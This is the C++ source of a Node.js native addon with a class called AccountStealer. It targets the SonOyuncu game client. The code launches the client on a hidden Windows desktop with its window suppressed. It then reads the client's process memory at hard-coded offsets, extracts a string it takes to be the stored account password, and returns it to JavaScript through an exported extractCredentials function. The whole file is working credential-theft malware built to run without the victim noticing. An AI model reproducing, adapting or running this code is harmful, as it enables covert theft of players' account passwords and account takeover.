#include <napi.h>
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <string>
#include <vector>
#include <regex>
#include <iostream>

static bool DEBUG_MODE = false;


/**
 * @author: Fatih1963
 * @version: 1.0
 * @date: 2025-06-23
 */

class AccountStealer {
private:
    std::string desktopName;
    HDESK hiddenDesktop;
    PROCESS_INFORMATION processInfo;
    std::string applicationPath;

public:
    AccountStealer() : desktopName("HiddenDesktop"), hiddenDesktop(nullptr) {
        char* appdata = getenv("APPDATA");
        if (appdata) {
            applicationPath = std::string(appdata) + "/.sonoyuncu/sonoyuncuclient.exe";
        }
        memset(&processInfo, 0, sizeof(processInfo));
    }

    ~AccountStealer() {
        cleanup();
    }

    bool createHiddenDesktop() {
        hiddenDesktop = CreateDesktopA(
            desktopName.c_str(),
            nullptr,
            nullptr,
            0,
            DESKTOP_CREATEWINDOW | DESKTOP_CREATEMENU | DESKTOP_WRITEOBJECTS | GENERIC_ALL,
            nullptr
        );
        return hiddenDesktop != nullptr;
    }

    bool launchApplication() {
        STARTUPINFOA startupInfo = {0};
        startupInfo.cb = sizeof(STARTUPINFOA);
        startupInfo.lpDesktop = const_cast<char*>(desktopName.c_str());
        startupInfo.dwFlags = STARTF_USESHOWWINDOW;
        startupInfo.wShowWindow = SW_HIDE;

        BOOL success = CreateProcessA(
            nullptr,
            const_cast<char*>(applicationPath.c_str()),
            nullptr,
            nullptr,
            FALSE,
            CREATE_NEW_CONSOLE,
            nullptr,
            nullptr,
            &startupInfo,
            &processInfo
        );

        if (!success) {
            if (hiddenDesktop) {
                CloseDesktop(hiddenDesktop);
                hiddenDesktop = nullptr;
            }
            return false;
        }

        return true;
    }

    DWORD_PTR getModuleBaseAddress(DWORD processId) {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, processId);
        if (hSnapshot == INVALID_HANDLE_VALUE) {
            if (DEBUG_MODE) std::cout << "CreateToolhelp32Snapshot failed. Error: " << GetLastError() << std::endl;
            return 0;
        }

        MODULEENTRY32 moduleEntry;
        moduleEntry.dwSize = sizeof(MODULEENTRY32);

        if (Module32First(hSnapshot, &moduleEntry)) {
            do {
                if (strcmp(moduleEntry.szModule, "sonoyuncuclient.exe") == 0) {
                    DWORD_PTR baseAddr = reinterpret_cast<DWORD_PTR>(moduleEntry.modBaseAddr);
                    if (DEBUG_MODE) std::cout << "Found module base address: 0x" << std::hex << baseAddr << std::endl;
                    CloseHandle(hSnapshot);
                    return baseAddr;
                }
            } while (Module32Next(hSnapshot, &moduleEntry));
        }

        CloseHandle(hSnapshot);
        if (DEBUG_MODE) std::cout << "sonoyuncuclient.exe module not found in process" << std::endl;
        return 0;
    }

    std::vector<BYTE> readProcessMemory(DWORD processId, DWORD_PTR address, SIZE_T size) {
        std::vector<BYTE> buffer(size);
        SIZE_T bytesRead = 0;

        HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, processId);
        if (hProcess == nullptr) {
            if (DEBUG_MODE) std::cout << "Failed to open process. Error: " << GetLastError() << std::endl;
            return std::vector<BYTE>();
        }

        BOOL success = ReadProcessMemory(
            hProcess,
            reinterpret_cast<LPCVOID>(address),
            buffer.data(),
            size,
            &bytesRead
        );

        if (!success && DEBUG_MODE) {
            std::cout << "ReadProcessMemory failed at address 0x" << std::hex << address
                      << ". Error: " << std::dec << GetLastError() << std::endl;
        }

        CloseHandle(hProcess);

        if (!success || bytesRead == 0) {
            return std::vector<BYTE>();
        }

        buffer.resize(bytesRead);
        return buffer;
    }

    std::string extractPasswordFromMemory(DWORD processId) {
        DWORD startTime = GetTickCount();
        const DWORD timeout = 15000;

        Sleep(2000);

        while (GetTickCount() - startTime < timeout) {
            DWORD_PTR baseAddress = getModuleBaseAddress(processId);
            if (baseAddress == 0) {
                Sleep(500);
                continue;
            }

            std::vector<DWORD_PTR> offsets = {
                0x1CA9B0,
                0x1CA900,
                0x1CAA00,
                0x1CA800,
                0x1CAB00
            };


            for (DWORD_PTR offset : offsets) {
                std::vector<BYTE> memoryData = readProcessMemory(processId, baseAddress + offset, 512);
                if (memoryData.empty()) {
                    continue;
                }

                std::vector<BYTE> cleanData;
                for (BYTE b : memoryData) {
                    if (b >= 32 && b <= 126) {
                        cleanData.push_back(b);
                    } else if (b == 0 && !cleanData.empty()) {
                        break;
                    }
                }

                if (cleanData.empty()) continue;

                std::string memoryString(cleanData.begin(), cleanData.end());

                std::regex pattern(R"([A-Za-z0-9._\-@+#$%^&*=!?~'",\\|/:<>\[\]{}()]{3,64})");
                std::sregex_iterator iter(memoryString.begin(), memoryString.end(), pattern);
                std::sregex_iterator end;

                for (; iter != end; ++iter) {
                    std::string match = iter->str();
                    if (match.length() >= 3 && match.length() <= 64) {
                        if (DEBUG_MODE) std::cout << "Found potential password at offset 0x" << std::hex << offset << ": " << match << std::endl;
                        return match;
                    }
                }
            }

            Sleep(500);
        }

        return "";
    }

    void cleanup() {
        if (processInfo.hProcess) {
            TerminateProcess(processInfo.hProcess, 0);
            CloseHandle(processInfo.hProcess);
            CloseHandle(processInfo.hThread);
            memset(&processInfo, 0, sizeof(processInfo));
        }

        if (hiddenDesktop) {
            CloseDesktop(hiddenDesktop);
            hiddenDesktop = nullptr;
        }
    }

    std::string extractCredentials() {
        if (!createHiddenDesktop()) {
            return "";
        }

        if (!launchApplication()) {
            return "";
        }

        std::string password = extractPasswordFromMemory(processInfo.dwProcessId);
        cleanup();

        return password;
    }
};

Napi::String ExtractCredentials(const Napi::CallbackInfo& info) {
    Napi::Env env = info.Env();

    if (info.Length() > 0 && info[0].IsBoolean()) {
        DEBUG_MODE = info[0].As<Napi::Boolean>().Value();
    }

    AccountStealer stealer;
    std::string password = stealer.extractCredentials();

    return Napi::String::New(env, password);
}

Napi::Boolean CheckApplicationExists(const Napi::CallbackInfo& info) {
    Napi::Env env = info.Env();

    if (info.Length() > 0 && info[0].IsBoolean()) {
        DEBUG_MODE = info[0].As<Napi::Boolean>().Value();
    }

    char* appdata = getenv("APPDATA");
    if (!appdata) {
        return Napi::Boolean::New(env, false);
    }

    std::string applicationPath = std::string(appdata) + "/.sonoyuncu/sonoyuncuclient.exe";

    DWORD fileAttributes = GetFileAttributesA(applicationPath.c_str());
    bool exists = (fileAttributes != INVALID_FILE_ATTRIBUTES &&
                   !(fileAttributes & FILE_ATTRIBUTE_DIRECTORY));

    return Napi::Boolean::New(env, exists);
}

Napi::Object Init(Napi::Env env, Napi::Object exports) {
    exports.Set(Napi::String::New(env, "extractCredentials"),
                Napi::Function::New(env, ExtractCredentials));
    exports.Set(Napi::String::New(env, "checkApplicationExists"),
                Napi::Function::New(env, CheckApplicationExists));
    return exports;
}

NODE_API_MODULE(addon, Init)